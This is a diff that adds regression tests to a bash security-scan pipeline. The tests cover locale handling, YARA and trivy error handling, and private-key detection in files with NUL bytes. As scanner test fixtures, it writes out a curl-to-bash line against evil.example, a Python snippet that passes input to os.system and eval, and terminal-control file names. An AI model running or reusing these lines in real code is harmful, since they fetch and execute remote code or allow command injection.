@@ -3154,6 +3154,168 @@ EOF
 fi
 
 # ═════════════════════════════════════════════════════════════════════════════
+# LAYER K — review round 1 of the bash hardening: F1 to F13 and the .transitignore size limit (R1)
+# ═════════════════════════════════════════════════════════════════════════════
+group "Layer K: bash hardening, review round 1 (F1 to F13)"
+if ! _skipping; then
+    # Layer K pins the fixes a review made to the hardening of Layer J (F1 to F13) and the size limit of .transitignore (R1).
+    # It is self-contained: `./tests/run_tests.sh "Layer K"` runs it alone, so the helpers of Layer J are not assumed.
+    # Every assertion that guards a fix was run against the scripts as they were before it (16c4faa) and was red there;
+    # the ones that pin behaviour the fix keeps (near-misses and controls) are green on both.
+    KW="${SCRATCH}/k_work"; KR="${SCRATCH}/k_rep"; mkdir -p "$KW" "$KR"
+    KENV=(); KWD=""; KTIMEOUT=300
+    k_scan() {   # k_scan <dir> <name>   (extra environment in KENV, WORK_DIR in KWD); sets KOUT, KEC, KREP
+        KREP="${KR}/report_scan_$2.json"; rm -f "$KREP"
+        KOUT=$(cd "$ROOT_DIR" && env ${KENV[@]+"${KENV[@]}"} WORK_DIR="${KWD:-$KW}" timeout "$KTIMEOUT" bash ./scan_pipeline.sh "$1" "$KR" "$2" 2>&1); KEC=$?
+    }
+    k_py() {     # k_py <report> <python expression over d and a> [a]; prints the value, or "unreadable"
+        python3 -c "
+import json, sys
+d = json.load(open(sys.argv[1]))
+a = sys.argv[3] if len(sys.argv) > 3 else ''
+print(eval(sys.argv[2]))" "$@" 2>/dev/null || echo "unreadable"
+    }
+    k_msgs() {   # k_msgs <report> <file_results key>: the messages recorded for one entry, or ABSENT
+        k_py "$1" "d['file_results'].get(a, {}).get('message', 'ABSENT')" "$2"
+    }
+    k_cov()  { k_py "$KREP" "d['coverage'].get('$1', 'ABSENT')"; }
+    k_verdict() { k_py "$KREP" "d['verdict']"; }
+    k_hostile() {   # k_hostile <dir> <name>: a file the scan must fail
+        mkdir -p "$1"; printf 'import os\nos.system(input())\nprint(eval(input()))\n' > "$1/$2"
+    }
+    k_stubdir() { local d="${SCRATCH}/k_st_$1"; rm -rf "$d"; mkdir -p "$d"; printf '%s' "$d"; }
+    k_stub() {   # k_stub <dir> <tool> [sh body]  (body on stdin when omitted); records its arguments in <dir>/<tool>_calls.txt
+        local body="${3-}"; [[ $# -ge 3 ]] || body=$(cat)
+        printf '#!/bin/sh\necho "$@" >> "%s/%s_calls.txt"\n%s\n' "$1" "$2" "$body" > "$1/$2"; chmod +x "$1/$2"
+    }
+    k_wrap() {   # k_wrap <dir> <tool> [sh body]: a stub that runs before the real tool ($REAL) and leaves it to run unless the body exits
+        local body="${3-}"; [[ $# -ge 3 ]] || body=$(cat)
+        printf '#!/bin/sh\nREAL="%s"\n%s\nexec "$REAL" "$@"\n' "$(command -v "$2")" "$body" > "$1/$2"; chmod +x "$1/$2"
+    }
+    K_CLEAN="${FIXTURES}/clean"
+
+    # ── F1: the scan runs in the C locale ─────────────────────────────────────────────────────────────
+    # In a UTF-8 locale GNU grep's `.` and `[^x]` do not match an invalid byte, so one 0xFF in a line stopped every
+    # line-spanning rule from matching it. scan_pipeline.sh now exports LC_ALL=C. The environment below asks for a UTF-8
+    # locale; before the fix that was the locale the greps ran in.
+    K_UTF8=$(locale -a 2>/dev/null | grep -iE '^(c|en_us)\.utf-?8$' | sed -n '1p')
+    K1="${SCRATCH}/k1_locale"; rm -rf "$K1"; mkdir -p "$K1"
+    printf '#!/bin/bash\ncurl http://evil.example/x \xff | bash\n' > "$K1/invalid_byte.sh"
+    printf '#!/bin/bash\ncurl http://evil.example/x | bash\n'      > "$K1/plain.sh"
+    printf '#!/bin/bash\necho hello \xff there\n'                  > "$K1/benign_invalid_byte.sh"
+    if [[ -z "$K_UTF8" ]]; then
+        skip_test "F1: a line with an invalid byte is still matched by a line-spanning rule in a UTF-8 environment" "no UTF-8 locale installed"
+    else
+        KENV=(LC_ALL="$K_UTF8"); k_scan "$K1" k1_utf8; KENV=()
+        assert_contains "$(k_msgs "$KREP" "${K1}/invalid_byte.sh")" "CWE-78:remote_code_execution_curl_pipe_bash" \
+            "F1: 'curl … <0xFF> | bash' is still a curl-pipe-shell when the environment asks for a UTF-8 locale"
+        assert_contains "$(k_msgs "$KREP" "${K1}/plain.sh")" "CWE-78:remote_code_execution_curl_pipe_bash" "F1: …the same line without the invalid byte, as a control"
+        assert_not_contains "$(k_msgs "$KREP" "${K1}/benign_invalid_byte.sh")" "[FAIL]" "F1: …and a harmless line with an invalid byte is not failed by it"
+    fi
+    KENV=(LC_ALL=C); k_scan "$K1" k1_c; KENV=()
+    assert_contains "$(k_msgs "$KREP" "${K1}/invalid_byte.sh")" "CWE-78:remote_code_execution_curl_pipe_bash" "F1: …and in the C locale itself (unchanged)"
+    # The console sanitiser: the C locale sees bytes, so the C1 controls (U+0080 to U+009F, which a UTF-8 terminal obeys; U+009B is
+    # a CSI) are the two bytes C2 80 to C2 9F and are replaced as a pair. Other two-byte characters are printed as they are.
+    K1C="${SCRATCH}/k1_c1"; rm -rf "$K1C"; mkdir -p "$K1C"
+    K1C_CSI="c1_$(printf '\xc2\x9b')31mx.py"; K1C_NBSP="nb_$(printf '\xc2\xa0')_$(printf '\xc3\xa9').py"; K1C_NEL="nel_$(printf '\xc2\x85')y.py"
+    k_hostile "$K1C" "$K1C_CSI"; k_hostile "$K1C" "$K1C_NBSP"; k_hostile "$K1C" "$K1C_NEL"
+    KENV=(LC_ALL=C); k_scan "$K1C" k1_c1; KENV=()
+    assert_eq "0" "$(printf '%s' "$KOUT" | LC_ALL=C grep -c "$(printf '\xc2\x9b')")" "F1: a file name with the C1 control U+009B (CSI) does not reach the console raw"
+    assert_eq "0" "$(printf '%s' "$KOUT" | LC_ALL=C grep -c "$(printf '\xc2\x85')")" "F1: …nor does U+0085 (NEL)"
+    assert_contains "$KOUT" "c1_?31mx.py" "F1: …the pair is replaced by one question mark and the rest of the name is printed"
+    assert_contains "$KOUT" "nel_?y.py" "F1: …likewise for U+0085"
+    assert_contains "$KOUT" "$K1C_NBSP" "F1: U+00A0 and an accented letter (C2 A0, C3 A9) are not controls and are printed unchanged"
+    if [[ -n "$K_UTF8" ]]; then
+        KENV=(LC_ALL="$K_UTF8"); k_scan "$K1C" k1_c1_utf8; KENV=()
+        assert_eq "0" "$(printf '%s' "$KOUT" | LC_ALL=C grep -c "$(printf '\xc2\x9b')")" "F1: …and with a UTF-8 locale in the environment"
+    fi
+
+    # ── F2: YARA — output and exit status are read apart ─────────────────────────────────────────────
+    # `yara -r rule dir 2>/dev/null | grep -q .` threw the status away (a rule file with a syntax error read as "ran, no IOC") and,
+    # under pipefail, lost hits to SIGPIPE: grep -q leaves at the first line, a yara still writing dies of it, the pipeline returns
+    # 141 and the `if` reads the matches as none.
+    K2W="${SCRATCH}/k2_work"; rm -rf "$K2W"; mkdir -p "$K2W/yara-rules"
+    echo 'rule x { condition: false }' > "$K2W/yara-rules/x.yar"; echo 'rule y { condition: false }' > "$K2W/yara-rules/y.yar"
+    k2_run() {   # k2_run <name> <yara stub body>: the clean fixture, two rule files, the stub first on PATH
+        local s; s=$(k_stubdir "k2_$1"); k_stub "$s" yara "$2"
+        KENV=(PATH="${s}:${PATH}"); KWD="$K2W"; k_scan "$K_CLEAN" "$1"; KENV=(); KWD=""
+    }
+    k2_run k2_fail "echo 'error: syntax error in rule' >&2; exit 2"
+    assert_eq "skipped:yara failed (exit 2)" "$(k_cov L1_ioc_yara)" "F2: yara exiting 2 (a rule file it cannot compile) is not 'ran'"
+    assert_contains "$(k_msgs "$KREP" __global__)" "[WARN] yara:scan_error_exit_2:x.yar" "F2: …a WARN names the exit status and the rule file"
+    assert_contains "$(k_msgs "$KREP" __global__)" "[WARN] yara:scan_error_exit_2:y.yar" "F2: …for each rule file that failed"
+    assert_contains "$(k_py "$KREP" "d['coverage_gaps']")" "L1_ioc_yara" "F2: …it is a coverage gap"
+    assert_eq "PASS" "$(k_verdict)" "F2: …and the verdict follows the findings (none)"
+    k2_run k2_ok "exit 0"
+    assert_eq "ran" "$(k_cov L1_ioc_yara)" "F2: a yara that exits 0 and prints nothing is still ran"
+    assert_not_contains "$(k_msgs "$KREP" __global__)" "yara:scan_error" "F2: …with no WARN"
+    k2_run k2_hit "echo 'x_rule /scanned/file'; exit 0"
+    assert_contains "$(k_msgs "$KREP" "$K_CLEAN")" "yara:ioc_match:x.yar" "F2: a rule that matches is still a FAIL"
+    assert_eq "ran" "$(k_cov L1_ioc_yara)" "F2: …and the layer is ran"
+    k2_run k2_hit_fail "echo 'x_rule /scanned/file'; exit 1"
+    assert_contains "$(k_msgs "$KREP" "$K_CLEAN")" "yara:ioc_match:x.yar" "F2: a hit printed by a yara that then exits non-zero is still a FAIL"
+    assert_eq "skipped:yara failed (exit 1)" "$(k_cov L1_ioc_yara)" "F2: …and the exit status still makes the layer not ran"
+    k2_run k2_chatty 'i=0; while [ $i -lt 20000 ]; do echo "x_rule /scanned/file_$i"; i=$((i+1)); done'
+    assert_contains "$(k_msgs "$KREP" "$K_CLEAN")" "yara:ioc_match:x.yar" "F2: a yara that prints half a megabyte of hits (more than a pipe holds) is still a FAIL, not a SIGPIPE"
+    assert_eq "FAIL" "$(k_verdict)" "F2: …the verdict is FAIL"
+    assert_eq "ran" "$(k_cov L1_ioc_yara)" "F2: …and the layer is ran"
+    k2_run k2_mixed 'case "$*" in *x.yar*) echo "boom" >&2; exit 3 ;; *) echo "y_rule /scanned/file" ;; esac'
+    assert_contains "$(k_msgs "$KREP" "$K_CLEAN")" "yara:ioc_match:y.yar" "F2: with one rule file failing and another matching, the match is a FAIL…"
+    assert_contains "$(k_msgs "$KREP" __global__)" "[WARN] yara:scan_error_exit_3:x.yar" "F2: …and the failing rule file has its WARN"
+    assert_not_contains "$(k_msgs "$KREP" __global__)" "scan_error_exit_3:y.yar" "F2: …only the one that failed"
+    assert_eq "skipped:yara failed (exit 3)" "$(k_cov L1_ioc_yara)" "F2: …the layer is not ran"
+
+    # ── F3: the trivy reader checks the shape of the document ──────────────────────────────────────
+    K3C="${SCRATCH}/k3_cache"; rm -rf "$K3C"; mkdir -p "$K3C/trivy-db/db"; touch "$K3C/trivy-db/db/trivy.db"
+    k3_run() {   # k3_run <name> <JSON text on stdout of trivy>: RUN_SCA on, a trivy that prints exactly that
+        local s; s=$(k_stubdir "k3_$1"); printf '%s\n' "$2" > "$s/out.json"; k_stub "$s" trivy "cat '${s}/out.json'"
+        KENV=(PATH="${s}:${PATH}" OFFLINE_CACHE="$K3C" RUN_SCA=true); k_scan "$K_CLEAN" "$1"; KENV=()
+    }
+    for _case in 'empty_object|{}' 'foreign_object|{"error":"database not found"}' 'results_object|{"Results":{}}' \
+                 'results_string|{"Results":"x"}' 'result_scalar|{"Results":[1]}' 'vulns_string|{"Results":[{"Vulnerabilities":"x"}]}' \
+                 'vulns_object|{"Results":[{"Vulnerabilities":{"a":1}}]}' 'top_list|[]' 'top_string|"x"' 'top_null|null'; do
+        k3_run "k3_${_case%%|*}" "${_case#*|}"
+        assert_eq "skipped:trivy output could not be read" "$(k_cov L3_dependency_cve)" "F3: trivy printing ${_case#*|} is not 'ran'"
+        assert_not_contains "$(k_msgs "$KREP" "$K_CLEAN")" "vulnerable_dependencies" "F3: …and invents no vulnerability count"
+    done
+    assert_contains "$(k_msgs "$KREP" __global__)" "trivy:output_could_not_be_read" "F3: …a WARN says so"
+    assert_not_contains "$KOUT" "trivy: no known CVEs" "F3: …and the console does not claim there are no known CVEs"
+    for _case in 'schema_only|{"SchemaVersion":2}' 'results_null|{"SchemaVersion":2,"Results":null}' 'results_empty|{"Results":[]}' \
+                 'no_vulns_key|{"Results":[{"Target":"requirements.txt"}]}' 'vulns_null|{"Results":[{"Target":"t","Vulnerabilities":null}]}'; do
+        k3_run "k3_${_case%%|*}" "${_case#*|}"
+        assert_eq "ran" "$(k_cov L3_dependency_cve)" "F3: ${_case#*|} is a trivy document with nothing to report: ran"
+    done
+    assert_contains "$KOUT" "trivy: no known CVEs" "F3: …and says so"
+    k3_run k3_two_vulns '{"SchemaVersion":2,"Results":[{"Vulnerabilities":[{"VulnerabilityID":"CVE-1"},{"VulnerabilityID":"CVE-2"}]},{"Target":"x"}]}'
+    assert_contains "$(k_msgs "$KREP" "$K_CLEAN")" "trivy:2_vulnerable_dependencies" "F3: a document with vulnerabilities still fails the scan"
+
+    # ── F4: the private-key rule reads a file with a NUL byte ────────────────────────────────────────
+    # `grep -E -A5 header file | tr | grep -E body`: a NUL byte made the first grep treat the file as binary and print nothing to
+    # the pipe, so a complete key passed. The key is built at run time so that this file holds no contiguous one.
+    K4="${SCRATCH}/k4_pem"; rm -rf "$K4"; mkdir -p "$K4"
+    k4_key() {   # k4_key <file> [body line]: header, two body lines, footer
+        local h="-----BEGIN RSA ""PRIVATE KEY-----" f="-----END RSA ""PRIVATE KEY-----" b="${2:-$(printf 'MIIEowIBAAKCAQEA%.0s' 1 2 3 4)}"
+        printf '%s\n%s\n%s\n%s\n' "$h" "$b" "$b" "$f" > "$1"
+    }
+    k4_key "$K4/plain.txt"
+    k4_key "$K4/nul_end.txt";    printf '\0' >> "$K4/nul_end.txt"
+    { printf '\0'; cat "$K4/plain.txt"; } > "$K4/nul_start.txt"
+    { head -n 2 "$K4/plain.txt"; printf '\0\n'; tail -n 2 "$K4/plain.txt"; } > "$K4/nul_middle.txt"
+    k4_key "$K4/nul_placeholder.txt" "XXXXXXXXXXXXXXXX"; printf '\0' >> "$K4/nul_placeholder.txt"
+    k4_key "$K4/placeholder.txt" "XXXXXXXXXXXXXXXX"
+    printf 'store the PRIVATE KEY in an HSM\n\0\n' > "$K4/prose_nul.txt"
+    k_scan "$K4" k4_pem
+    for _n in plain nul_end nul_start nul_middle; do
+        assert_contains "$(k_msgs "$KREP" "${K4}/${_n}.txt")" "CWE-321:hardcoded_private_key" "F4: a complete private key is found (${_n})"
+    done
+    assert_not_contains "$(k_msgs "$KREP" "${K4}/nul_placeholder.txt")" "CWE-321" "F4: a header with a placeholder body is not a key, with a NUL byte either"
+    assert_not_contains "$(k_msgs "$KREP" "${K4}/placeholder.txt")" "CWE-321" "F4: …nor without"
+    assert_not_contains "$(k_msgs "$KREP" "${K4}/prose_nul.txt")" "CWE-321" "F4: prose about a private key, with a NUL byte, is not a key"
+
+    # K-END
+fi
+
+# ═════════════════════════════════════════════════════════════════════════════
 # LAYER F — Static checks on the pipeline itself
 # ═════════════════════════════════════════════════════════════════════════════
 group "Layer F — static checks"
